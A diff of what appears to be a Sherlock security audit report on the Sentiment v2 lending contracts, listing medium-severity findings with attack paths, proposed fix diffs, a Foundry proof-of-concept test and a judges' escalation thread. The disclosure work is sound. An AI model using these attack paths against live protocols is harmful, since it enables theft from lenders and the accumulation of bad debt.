-   \text{MAV} = \text{DV} \times \sum_{j=0}^{n} \frac{1}{ (\text{ltv}_j \times w_j)}
-   $$
-```
-3. The summation:
-```math
-   $$
-   \sum_{j=0}^{n} \frac{w_j}{\text{ltv}_j} = \frac{w_0}{\text{ltv}_0} + \cdots + \frac{w_n}{\text{ltv}_n}
-   $$
-```
-4. This expression is not equal to:
-```math
-   $$
-   \frac{1}{\text{ltv}_0 \times w_0 + \cdots + \text{ltv}_n \times w_n}
-   $$
-```
-### Example : 
-- let's explain the issue from an easy and logical perspective with the followign example : 
-- Consider a user's position with the following characteristics:
-
-  - Pool: `poolId-A`
-  - Assets: 
-    - asset-1: `100$ (LTV 90%)`
-    - asset-2: `100$ (LTV 50%)`
-  - Total collateral value: `200$`
-
-
-- Logically,The maximum debt this user should be able to take from `poolId-A` is:
-
-`(100$ * 90%) + (100$ * 50%) = 90$ + 50$ = 140$`
-
-- If the user has borrowed 140$, the minimum required asset value to keep the position healthy should remain 200$.
-
-- Now, let's see how the current implementation calculates this:
-```js
-for (uint256 j; j < positionAssetsLength; ++j) {
-    uint256 ltv = riskEngine.ltvFor(debtPools[i], positionAssets[j]);
-    minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
-}
-```
-- for our case:
-
-    - For asset-1: `140$ * 0.5 / 0.9 = 77.78$`
-    - For asset-2: `140$ * 0.5 / 0.5 = 140$`
-    - Total minReqAssetValue: `77.78$ + 140$ =` **`217.78$`**
-
--  The function calculates a minimum required asset value of `217.78$`, which is significantly higher than the actual minimum collateral required of `200$` for a position that should be considered healthy.
-
-## Impact
-- Position will be liquidated eventhough they are healthy which cause lose of funds for users unfairely.
-- Users won't be able to borrow/withdraw funds to the maximum they are allowed to. Knowing that sentiment is a leveraged lending protocol by design, this represents a big issue
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L250
-## Tool used
-
-Manual Review
-
-## Recommendation
-To fix this, the protocol needs to implement the correct formula by dividing the pool debt value by the weighted-averaged ltv
-
+It is recommended to adjust token/share ratio if it has been inflated to a very large value, but ensure the precision loss is acceptable. For example, if the ratio value is $1000000000000000000000000000000000000$ ($1e36$), it can be adjusted to $1000000000000000000$ ($1e18$). This can be done by using a dynamic `AdjustFactor` to limit the ratio to a reasonable range:
+[SuperPool.sol#L456-L472](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L456-L472):
 ```diff
-function _getMinReqAssetValue(
-    uint256[] memory debtPools,
-    uint256[] memory debtValuleForPool,
-    address[] memory positionAssets,
-    uint256[] memory wt,
-    address position
-) internal view returns (uint256) {
-    uint256 minReqAssetValue;
--   uint256 weigtedAvgLtv;
-
-    // O(pools.len * positionAssets.len)
-    uint256 debtPoolsLength = debtPools.length;
-    uint256 positionAssetsLength = positionAssets.length;
-    for (uint256 i; i < debtPoolsLength; ++i) {
--       weigtedAvgLtv = 0;
-+       uint256 weightedAvgLtv = 0;
-        for (uint256 j; j < positionAssetsLength; ++j) {
-            uint256 ltv = riskEngine.ltvFor(debtPools[i], positionAssets[j]);
-
-            // revert with pool id and the asset that is not supported by the pool
-            if (ltv == 0) revert RiskModule_UnsupportedAsset(position, debtPools[i], positionAssets[j]);
-
--           minReqAssetValue += wt[j].mulDiv(ltv,1e18, Math.Rounding.Up);
-+           weightedAvgLtv += wt[j].mulDiv(ltv, 1e18, Math.Rounding.Down);
-        }
--       minReqAssetValue += debtValuleForPool[i].mulDiv(1e18,weigtedAvgLtv,Math.Rounding.Up);
-+       minReqAssetValue += debtValuleForPool[i].mulDiv(1e18, weightedAvgLtv, Math.Rounding.Up);
+    function _convertToShares(
+        uint256 _assets,
+        uint256 _totalAssets,
+        uint256 _totalShares,
+        Math.Rounding _rounding
+    ) public view virtual returns (uint256 shares) {
+-       shares = _assets.mulDiv(_totalShares + 1, _totalAssets + 1, _rounding);
++       shares = _assets.mulDiv(_totalShares / AdjustFactor + 1, _totalAssets + 1, _rounding);
     }
 
-    if (minReqAssetValue == 0) revert RiskModule_ZeroMinReqAssets();
-    return minReqAssetValue;
-}
+    function _convertToAssets(
+        uint256 _shares,
+        uint256 _totalAssets,
+        uint256 _totalShares,
+        Math.Rounding _rounding
+    ) public view virtual returns (uint256 assets) {
+-       assets = _shares.mulDiv(_totalAssets + 1, _totalShares + 1, _rounding);
++       assets = (_shares / AdjustFactor).mulDiv(_totalAssets + 1, (_totalShares / AdjustFactor) + 1, _rounding);
+    }
 ```
-Using this corrected implementation with the example:
-
-For `poolId-A` with `140$` debt:
-  - `weightedAvgLtv = (0.5 * 90%) + (0.5 * 50%) = 70%`
-  - `minReqAssetValue = 140$ * (1 / 70%) = 200$`
-  
-This calculation correctly results in the expected minRequiredAssetValue of 200$.
 
 
 
 ## Discussion
 
+**z3s**
+
+This should be mitigated by burning shares initially
+
+**0xh2134**
+
+Escalate.
+
+This is a valid issue.
+
+The only way to burn shares in SuperPool is to withdraw, as shares are burned, the assets are decreased too, therefore `Shares per Token` remains the same (and will continue to be inflated by bad debts), this does not help to mitigate this issue.
+
 **sherlock-admin3**
 
-1 comment(s) were left on this issue during the judging contest.
+> Escalate.
+> 
+> This is a valid issue.
+> 
+> The only way to burn shares in SuperPool is to withdraw, as shares are burned, the assets are decreased too, therefore `Shares per Token` remains the same (and will continue to be inflated by bad debts), this does not help to mitigate this issue.
 
-**Nihavent** commented:
->  This is a great explanation of why the attacks in [299](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/299) and [558](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/558) are possible. If I'm not mistaken, this fix also prevents those attacks.
+You've created a valid escalation!
 
+To remove the escalation from consideration: Delete your comment.
 
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
 
-# Issue M-16: The liquidation will revert if the left amount in `debt < MIN_DEBT` 
+**ruvaag**
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/194 
+This does not account for Shares burned when SuperPool is initally deployed, using SuperPoolFactory.sol. Not an issue imo.
 
-## Found by 
-A2-security
-## Summary
-This bug was firstl discovered in the Guardian Audit report H-17:Users Can Avoid Liquidations. The sponsor have marked this issue as resolved, and have asked fellow watsons to also check if all the issues from the guardian report, that were marked as resolved, have been fully mitigated. In this case, the bug still exists.
+**0xh2134**
 
-## Vulnerability Detail
-At the end of liquidation, the pool.repay() function will be called
-```js
-@>    pool.repay(poolId, position, amt);
-    // update position to reflect repayment of debt by liquidator
-    Position(payable(position)).repay(poolId, amt);
-}
-```
-The `repay()` function however still implements the same `MIN_DEBT` check, which will lead to the exact same scenario intended to be mitigated. 
+> This does not account for Shares burned when SuperPool is initally deployed, using SuperPoolFactory.sol. Not an issue imo.
 
-```solidity
-    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
----
-        // revert if repaid amt is too small
-        if (borrowShares == 0) revert Pool_ZeroSharesRepay(poolId, amt);
+Shares burned when SuperPool is initially deployed only helps to mitigate vault inflation attack, however, this report describe a different issue, and the POC shows how exactly the shares are inflated to overflow.
 
-        // check that final debt amount is greater than min debt
-        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
-        if (remainingShares > 0) {
-            uint256 newBorrowAssets = _convertToAssets(
-                remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
-            );
-@>            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
-@>                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
-@>            }
-        }
-```
+**ruvaag**
 
-## Impact
-As Mentioned in the guardian report, this issue exposes the protocol of risk the accumulation of bad debt and liquidation reverting.
-Please also notice, that the likeablity of this scenario increases the more unhealthy the position, leading to profitable liquidation attempts reverting. Also noting that sentiment is a leveraged lending protocol, the risk of the accumulation of such positions is significant
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/Pool.sol#L482-L514
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L484-L500
-3
+you're right, this isn't the same. i think the root cause here is the same as #585 but for the SuperPool instead of the Pool as mentioned in the other issue.
 
-## Tool used
+**0xh2134**
 
-Manual Review
+> you're right, this isn't the same. i think the root cause here is the same as #585 but for the SuperPool instead of the Pool as mentioned in the other issue.
 
-## Recommendation
-The simplest way to mitigate this, is to refactor the code in `repay()` to an internal `_repay()` function that recieves an extra force argument and to bypass this check if the this force value is set to true
-```solidity
-    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
-        _repay(poolId,position,amt,false)
-    }
-```
-```solidity
-    function reduceDebt(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
-        _repay(poolId,position,amt,true)
-    }
-```
+Yes, it's similar to #585 but they are different issues.
 
-# Issue M-17: Missing 'minDebt' check from liquidation can lead to bad debt accumulation 
+**cvetanovv**
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/198 
+I think this issue is a valid Medium. The reason it is not High is because this involves certain external conditions, such as the occurrence of bad debt liquidations, which would inflate the Super Pool shares. 
 
-## Found by 
-AlexCzm
-### Summary
+While the overflow potential is significant, it requires multiple bad debt liquidations to occur, making the issue dependent on specific states and not an immediate or guaranteed loss of funds.
 
+I am planning to accept the escalation and make this issue Medium.
 
-The missing `minDebt` check from `PositionManager.liquidate` can leave positions with a small amount of debt that is unappealing to further liquidations and  can lead to accumulation of bad debt. 
+**samuraii77**
 
-### Root Cause
+Seems like a duplicate of #585 to me, what is the difference?
 
-Protocol implements a `borrowAssets < minDebt` check in `Pool.borrow` ([link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L452)) and `Pool.repay` ([link2](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L511)), but this check is missing from liquidations. 
+**0xjuaan**
 
-### Internal pre-conditions
+This issue is different to 585 since it is regarding SuperPool shares, but they both require the liquidator bots to not work for multiple consecutive instances, even though max LTV is 98% so liquidations will be incentivised.
 
-1. An unhealthy position must exist.
+**cvetanovv**
 
-### External pre-conditions
+This issue will be the same severity as #585 because it requires multiple bad debt liquidations, and the protocol has off-chain bots that won't allow that.
 
-none
+If #585 is valid after the escalation, this issue will also be valid.
 
-### Attack Path
+Planning to reject the escalation and leave the issue as is. 
 
-1. An liquidator/attacker observes an unhealthy positions and calls `PositionManager.liquidate` and repays just enough debt such that after liquidations  `0 < the new position's debt < minDebt`. 
-2. After 1st liquidation position became sound with debt < assets deposited.
-3. After some time, due to market conditions, same position became unhealthy again. But due to gas prices and small position the liquidators are disincentivized to liquidate it.  
-4. Due to further asset's prices decrease, position accumulate bad debt and lenders must take a loss. 
-Since the protocol can be deployed to Ethereum L1 small
+**0xh2134**
 
-### Impact
+> This issue will be the same severity as #585 because it requires multiple bad debt liquidations, and the protocol has off-chain bots that won't allow that.
+> 
+> If #585 is valid after the escalation, this issue will also be valid.
+> 
+> Planning to reject the escalation and leave the issue as is.
 
-Protocol can have many positions with `debt < minDebt`. Over time, since there will be no incentive for liquidators to liquidate small underwater positions given the gas cost, protocol accumulates bad debt at the detrimental of lenders.
+I don't think this issue's severity should be determined by #585, protocol's off-chain bots will work only when the the liquidation is profitable, and if not (e.g. major price dump), bad debt liquidation will happen, unlike #585, no consecutive bad debt liquidations are needed, even if there are bot liquidations in between, the issue will eventually occur, and it's not a low likelihood event considering the whole lifetime of a SuperPool.
 
-### PoC
+**cvetanovv**
 
-_No response_
+I will agree with the comment @0xh2134
 
-### Mitigation
+Bad debt liquidation can occur with a high TVL and high price volatility, and the bots may not have the initiative to liquidate an asset. There is already a valid issue related to this in this contest.
 
-Ensure that liquidators liquidate entire position's debt or, that the remaining debt after liquidation is bigger than `minDebt`. 
+Because of that this issue is Medium severity.
 
-# Issue M-18: Liquidator will incur losses during liquidation leading to bad debt accumulation 
+I am planning to accept the escalation and make this issue Medium.
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/201 
+**WangSecurity**
 
-## Found by 
-4gontuk
-### Summary
+Result:
+Medium
+Unique
 
-The lack of handling for bad debt in `PositionManager.sol` will cause an economic disincentive for liquidators, leading to potential bad debt accumulation for the protocol as liquidators will avoid liquidating positions with insufficient collateral.
+**sherlock-admin4**
 
+Escalations have been resolved successfully!
 
-### Root Cause
+Escalation status:
+- [0xh2134](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/266/#issuecomment-2351863788): accepted
 
-In [`PositionManager.sol: _repayPositionDebt`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L484-L500) the function assumes full debt repayment by the liquidator without considering the available collateral.
-
-
-### Internal pre-conditions
-
-1. A position must have debt exceeding its collateral value.
-2. The liquidator must attempt to liquidate the position.
-
-### External pre-conditions
-
-1. The value of the collateral must drop significantly, causing the debt to exceed the collateral value.
-
-### Attack Path
-
-1. A position's collateral value drops below its debt value.
-2. A liquidator attempts to liquidate the position.
-3. The liquidator is required to repay the full debt amount, which exceeds the collateral value.
-4. The liquidator incurs a loss, making it economically unfeasible to proceed with the liquidation.
-5. Liquidators avoid liquidating such positions, leading to bad debt accumulation in the protocol.
-
-
-### Impact
-
-The protocol suffers from bad debt accumulation as liquidators avoid liquidating positions with insufficient collateral, leading to potential financial instability.
-
-### PoC
-
-1. Assume a position has a debt of 1000 USDC and collateral worth 800 USDC.
-2. The liquidator attempts to liquidate the position.
-3. The liquidator is required to repay the full 1000 USDC debt.
-4. The liquidator incurs a loss of 200 USDC (1000 USDC debt - 800 USDC collateral).
-5. Liquidators avoid such liquidations, leading to bad debt accumulation.
-
-### Mitigation
-
-Modify the [`_repayPositionDebt` function](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L484-L500) to handle partial debt repayment based on available collateral. This ensures liquidators only repay what is economically feasible, preventing bad debt accumulation.
-
-```diff
-function _repayPositionDebt(address position, DebtData[] calldata debtData) internal {
-    // sequentially repay position debts
-    // assumes the position manager is approved to pull assets from the liquidator
-    uint256 debtDataLength = debtData.length;
-    for (uint256 i; i < debtDataLength; ++i) {
-        uint256 poolId = debtData[i].poolId;
-        address poolAsset = pool.getPoolAssetFor(poolId);
-        uint256 amt = debtData[i].amt;
-        uint256 positionDebt = pool.getBorrowsOf(poolId, position);
-
-        // if the passed amt is type(uint256).max assume repayment of the entire debt
-        if (amt == type(uint256).max) amt = positionDebt;
-
-+       // calculate the maximum repayable amount based on the liquidator's balance
-+       uint256 liquidatorBalance = IERC20(poolAsset).balanceOf(msg.sender);
-+       uint256 repayAmount = amt > liquidatorBalance ? liquidatorBalance : amt;
-
--       // transfer debt asset from the liquidator to the pool
--       IERC20(poolAsset).safeTransferFrom(msg.sender, address(pool), amt);
--       // trigger pool repayment which assumes successful transfer of repaid assets
--       pool.repay(poolId, position, amt);
--       // update position to reflect repayment of debt by liquidator
--       Position(payable(position)).repay(poolId, amt);
-
-+       // transfer debt asset from the liquidator to the pool
-+       IERC20(poolAsset).safeTransferFrom(msg.sender, address(pool), repayAmount);
-+       // trigger pool repayment which assumes successful transfer of repaid assets
-+       pool.repay(poolId, position, repayAmount);
-+       // update position to reflect repayment of debt by liquidator
-+       Position(payable(position)).repay(poolId, repayAmount);
-
-+       // handle remaining debt if any
-+       if (repayAmount < positionDebt) {
-+           // logic to handle remaining debt, e.g., updating records, notifying stakeholders, etc.
-+       }
-    }
-}
-```
-
-# Issue M-19: Rounding Errors will Prevent Full Debt Repayment for Users 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/207 
-
-The protocol has acknowledged this issue.
-
-## Found by 
-4gontuk
-### Summary
-
-Rounding down in the [`repay` function](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L482-L527) will cause an inability to fully repay debt for users as the function will leave a small amount of debt due to rounding down borrow shares.
-
-### Root Cause
-
-In [`protocol-v2/src/Pool.sol::repay`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L482-L527) the function rounds down the borrow shares to burn, which can leave a small amount of debt.
-
-### Internal pre-conditions
-
-1. User needs to have an outstanding debt in the pool.
-2. User needs to call the `repay` function with an amount intended to fully repay the debt.
-
-
-### External pre-conditions
-
-None.
-
-### Attack Path
-
-1. User calls `getBorrowsOf` to determine the total debt.
-2. User calls `repay` with the amount returned by `getBorrowsOf`.
-3. The `repay` function rounds down the borrow shares to burn, leaving a small amount of debt.
-4. User is unable to fully repay the debt due to the remaining borrow shares.
-
-
-### Impact
-
-The users cannot fully repay their debt, which can cause issues with the minimum debt requirement and prevent the removal of the debt pool from the user's debtPools array.
-
-### PoC
-
-1. User has a debt of 100.5 units in the pool.
-2. User calls `getBorrowsOf` and gets a debt amount of 100.5 units.
-3. User calls `repay` with 100.5 units.
-4. The `repay` function rounds down the borrow shares, leaving 0.5 units of debt.
-5. User is unable to fully repay the debt, causing issues with the minimum debt requirement.
-
-
-### Mitigation
-
-To fix the issue, the `repay` function should round up the borrow shares to burn when the user is repaying the entire debt.
-
-### Code Fix:
-```diff
-function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
-    PoolData storage pool = poolDataFor[poolId];
-
-    // ... existing code ...
-
-    // compute borrow shares equivalent to notional asset amt
--   uint256 borrowShares = _convertToShares(amt, pool.totalBorrowAssets, pool.totalBorrowShares, Math.Rounding.Down);
-+   uint256 borrowShares = _convertToShares(amt, pool.totalBorrowAssets, pool.totalBorrowShares, Math.Rounding.Up);
-
-    // ... existing code ...
-}
-```
-
-This change ensures that the `repay` function rounds up the borrow shares to burn, preventing the issue of leaving a small amount of debt due to rounding down. This will allow users to fully repay their debt without leaving any residual borrow shares.
-
-# Issue M-20: All borrowed assest are deducted instead of LOSS leading to Improper Loss Calculation in Bad Debt Liquidation Leading to Significant User Losses 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/211 
-
-The protocol has acknowledged this issue.
-
-## Found by 
-A2-security, Bigsam, X12
-## Summary
-The implementation of the `rebalanceBadDebt` function fails to correctly handle bad debt liquidation, leading to an inequitable distribution of losses among lenders. Instead of socializing the loss proportionally among all lenders, the function deducts the entire amount of borrowed shares from the pool, potentially causing a significant loss for users withdrawing from the Pool while SuperPool loses funds as more shares are burnt to receive less assets. This can result in a user losing 20% or more of the tokens they should receive.
-_Docs-_
-
-_### Bad Debt Positions_
-
-**Bad debt positions positions include positions that owe more debt to the protocol than the total value of assets in the position.** The purpose of liquidating a bad debt position is to ensure the Base Pool is not rendered unusable due to accumulation of bad debt. Accordingly, these positions can only be liquidated by the protocol governance.
-
-The process of liquidating a bad debt position involves socializing the bad debt across all lenders of the Base Pool proportional to their share of deposits. The protocol clears the debt owed by the bad debt position and **the loss is realized equitably among all lenders.**
-
-## Vulnerability Detail
-
-According to the protocol documentation, when liquidating a bad debt position, the loss should be socialized across all lenders in the Base Pool proportionally to their share of deposits. This ensures that no single user bears the entire loss and the Base Pool remains usable.
-
-However, the current implementation of the `rebalanceBadDebt` function does not adhere to this principle. Instead, it deducts the entire amount of asset borrowed from the pool without considering the actual loss incurred. This behavior leads to a situation where a user who withdraws from the SuperPool immediately this function is called will receive significantly fewer tokens than they are entitled to and more of their shares will burnt, as the total deposit amount is reduced by the borrowed amount rather than the actual loss.
-
-
-
-```solidity
-function rebalanceBadDebt(uint256 poolId, address position) external {
-    PoolData storage pool = poolDataFor[poolId];
-    accrue(pool, poolId);
-
-    // revert if the caller is not the position manager
-    if (msg.sender != positionManager) revert Pool_OnlyPositionManager(poolId, msg.sender);
-
-    // compute pool and position debt in shares and assets
-    uint256 totalBorrowShares = pool.totalBorrowShares;
-    uint256 totalBorrowAssets = pool.totalBorrowAssets;
-    uint256 borrowShares = borrowSharesOf[poolId][position];
-    // [ROUND] round up against lenders
-    uint256 borrowAssets = _convertToAssets(borrowShares, totalBorrowAssets, totalBorrowShares, Math.Rounding.Up);
-
-    // rebalance bad debt across lenders
-    pool.totalBorrowShares = totalBorrowShares - borrowShares;
-    // handle borrowAssets being rounded up to be greater than totalBorrowAssets
-    pool.totalBorrowAssets = (totalBorrowAssets > borrowAssets) ? totalBorrowAssets - borrowAssets : 0;
-    uint256 totalDepositAssets = pool.totalDepositAssets;
-
-@audit>> we are reducing by totalborrowasset not LOSS>>   pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
-    borrowSharesOf[poolId][position] = 0;
-}
-```
-
-
-## Impact
-
-This issue can lead to significant financial losses for users withdrawing from the SuperPool. As the total deposit assets are incorrectly reduced, users may lose a large portion of their tokens.
-### Steps to Reproduce
-
-1. A user deposits assets into the SuperPool.
-2. Another user borrows a significant amount from the Base Pool.
-3. The borrowed amount is not repaid, leading to a bad debt situation.
-4. The `rebalanceBadDebt` function is called to liquidate the bad debt.
-5. The function reduces the total deposit assets by the entire borrowed amount instead of the actual loss incurred.
-6. The first user attempts to withdraw their assets from the SuperPool and receives significantly less than expected due to the incorrect deduction.
-
-
-```solidity
-// instead of reducing the total deposit by the loss we deduct the whole amount borrowed
-    function testDepositBorrowLiquidateandWithdrawAssets() public { //uint96 assets
-        uint96 assets1 = 200e18;
-        testCanDepositAssets(assets1);
-
-// initiall shares of user 200e18
-        assertEq(pool.getAssetsOf(linearRatePool, user),200e18);
-
-       
-     // another user borrows 10e18 and his borrow ebters baddebt, loss of about 74% of the position. the debt was cleared but when user withdraws 100e18 all his shares is burnt because all the borrowed amount was deducted.   
-         vm.startPrank(user);
-        asset2.approve(address(positionManager), 100e18);
-        asset3.approve(address(positionManager), 50e18);
-
-        // deposit 1e18 asset2, borrow 1e18 asset1
-        Action[] memory actions = new Action[](6);
-        (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
-        actions[1] = deposit(address(asset2), 100e18);
-        actions[2] = deposit(address(asset3), 50e18);
-
-        actions[3] = addToken(address(asset2));
-        actions[4] = addToken(address(asset3));
-        actions[5] = borrow(linearRatePool, 100e18);
-        // actions[4] = approve(address(mockswap), address(asset1), 1e18);
-        // bytes memory data = abi.encodeWithSelector(SWAP_FUNC_SELECTOR, address(asset1), address(asset3), 1e18);
-        // actions[5] = exec(address(mockswap), 0, data);
-        // actions[6] = addToken(address(asset3));
-        positionManager.processBatch(position, actions);
-        vm.stopPrank();
-        assertTrue(riskEngine.isPositionHealthy(position));
-
-        // (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(position);
-
-        // assertEq(totalAssetValue, 150e18);
-        // assertEq(totalDebtValue, 100e18);
-        // assertEq(minReqAssetValue, 111.1111111111111110001e18);
-
-        // construct liquidator data
-        DebtData memory debtData = DebtData({ poolId: linearRatePool, amt: type(uint256).max });
-        DebtData[] memory debts = new DebtData[](1);
-        debts[0] = debtData;
-        AssetData memory asset1Data = AssetData({ asset: address(asset3), amt: 50e18 });
-        AssetData memory asset2Data = AssetData({ asset: address(asset2), amt: 100e18 });
-        AssetData[] memory assets = new AssetData[](2);
-        assets[0] = asset1Data;
-        assets[1] = asset2Data;
-
-        // modify asset2 price from 1eth to 0.1eth
-        FixedPriceOracle pointOneEthOracle = new FixedPriceOracle(1e16);
-        vm.prank(protocolOwner);
-        riskEngine.setOracle(address(asset2), address(pointOneEthOracle));
-         vm.stopPrank();
-        assertFalse(riskEngine.isPositionHealthy(position));
-
-         // modify asset2 price from 1eth to 0.1eth
-        FixedPriceOracle pointtwoEthOracle = new FixedPriceOracle(5e17);
-        vm.prank(protocolOwner);
-        riskEngine.setOracle(address(asset3), address(pointtwoEthOracle));
-         vm.stopPrank();
-        assertFalse(riskEngine.isPositionHealthy(position));
-
-        (uint256 totalAssetValue2, uint256 totalDebtValue2, uint256 minReqAssetValue2) = riskEngine.getRiskData(position);
-
-        assertEq(totalAssetValue2, 26e18);
-        assertEq(totalDebtValue2, 100e18);
-        assertEq(minReqAssetValue2, 111.111111111111111001e18);
-
-       
-
-        // liquidate
-        vm.startPrank(protocolOwner);
-        asset1.approve(address(positionManager), 100e18);
-        positionManager.liquidateBadDebt(position);
-        vm.stopPrank();
-
-        vm.prank(user);
-        pool.withdraw(linearRatePool, 100e18, user, user);
-
-        assertEq(pool.getAssetsOf(linearRatePool, user), 0);
-        assertEq(pool.balanceOf(user, linearRatePool), 0);
-
-
-        assertEq(asset1.balanceOf(user), 100000000000000000000);
-
-// even if admins tries to swap and redeposit this token back there is a big risk here 
-// 1. contract can be paused  
-// 2. the deposit inflates the deposited shares and the loss to the user remains the same
-
-    }
-```
-
-## Code Snippet
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L528-L549
-
-## Tool used
-
-Manual Review
-
-## Recommendation
-
-
-
-Even if Admin batches a call to clear bad debt and swap the asset gotten and redeposit into the pool we should note that pools can be paused to prevent deposits but withdrawals, and bad debt clearing can't be stopped.  hence it is safe to account for this appropriately and transfer the swapped funds back to the pool. 
-
-To correctly socialize the loss among all lenders, modify the `rebalanceBadDebt` function to calculate the actual loss and distribute it proportionally among all lenders. 
-
-### Proposed Solution
-
-1. Calculate the loss in ETH: `loss = ETH value of borrowed asset - ETH value of total deposit`.
-2. Determine the loss per lender by dividing the loss by the total borrowed asset in ETH.
-3. Multiply the result by the total borrowed asset in token decimals to get the actual loss to be subtracted.
-4. Update the `rebalanceBadDebt` function to include a new variable for the loss and adjust the total deposit assets accordingly.
-
-Here’s a conceptual example of the modification:
-
-```solidity
-uint256 loss = (totalBorrowAssetsInETH - totalDepositAssetsInETH);
-uint256 lossInToken = (loss * totalBorrowAssetsInTokenDecimals) / totalBorrowAssetsInETH;
-
-```
-
-This change will ensure that the loss is equitably realized among all lenders, preventing a significant and unfair loss to any single user.
-
-# Issue M-21: Small loans can extend the TVL of any position up to 90% 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/215 
-
-## Found by 
-X12
-## Summary
-Users can exploit the `minDebt` feature to extend their LTV up to 90% for risky assets.
-
-## Vulnerability Detail
-The system uses a `minDebt` threshold to ensure that positions are profitable for liquidation. Loans below this amount may not be profitable to liquidate, as liquidators would incur gas fees, increasing their costs.
-
-The [repay](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L506-L514) function checks if the borrowed amount is below `minDebt` and reverts the TX if it is.
-
-```solidity
-        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
-        if (remainingShares > 0) {
-            uint256 newBorrowAssets = _convertToAssets(
-                remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
-            );
-            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
-                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
-            }
-        }
-```
-
-Liquidators also cannot seize the entire position. They are limited to a maximum of `debt repaid * 1e18 / 0.9e18`, which is 11% more than what they have to repay. That's their profit.
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L156-L159
-
-```solidity
-        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
-        if (assetSeizedValue > maxSeizedAssetValue) {
-            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
-        }
-```
-
-Users combine the above 2 mechanics and game the system by taking small loans that prevent liquidators from fully liquidating their position due to the `minDebt` limit, while also making partial liquidation unprofitable.
-
-**Example:**
-1. A WETH pool has risky collateral - token X with an LTV of 50%.
-2. Alice opens a position with collateral X valued at 0.05 ETH (equal to `minDebt`).
-3. She borrows 0.25 WETH from the pool.
-4. The asset’s price drops, increasing her LTV to 55%.
-
-Alice won’t be liquidated because any liquidation attempt would leave her position below `minDebt`, causing the transaction to revert. Liquidators must wait until her LTV reaches 90% to perform a full liquidation (~0.045 debt, for 0.05 col). 
-
-Alice can also avoid paying her debt, as the risky asset might very well quickly cross the gap between 90% and 100% and make her position insolvent, causing bad debt. She can abuse this on chains with low fees (ARB, BASE, OP) and create multiple position borrowing from the pool.
-
-## Impact
-The core LTV mechanism is broken. Users can leverage risky assets with high LTV, increasing the system’s exposure to bad debt.
-
-## Code Snippet
-```solidity
-        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
-        if (assetSeizedValue > maxSeizedAssetValue) {
-            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
-        }
-```
-
-## Tool Used
-Manual Review
-
-## Recommendation
-Allow liquidators to fully liquidate a position if the remaining value is less than `minDebt`.
-
-# Issue M-22: `SuperPool` is ERC-4626 compliant, but the `maxWithdraw` & `maxRedeem` functions are not fully up to EIP-4626's specification 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/246 
-
-## Found by 
-000000, Atharv, Flare, h2134, pseudoArtist
-## Summary
-The `maxWithdraw` & `maxRedeem` functions should return the `0` when the withdrawal is `paused`, but in this case it is not returning 0.
-## Vulnerability Detail
-SuperPool can be paused, since it is pausable contract and also there is a function `togglePause()` , also in the readMe it is specifically written that `superPool` is supposed to be strictly ERC4626 compliant, i.e any issue arising from non compliance should be taken into account and will be a valid issue in this case.
-
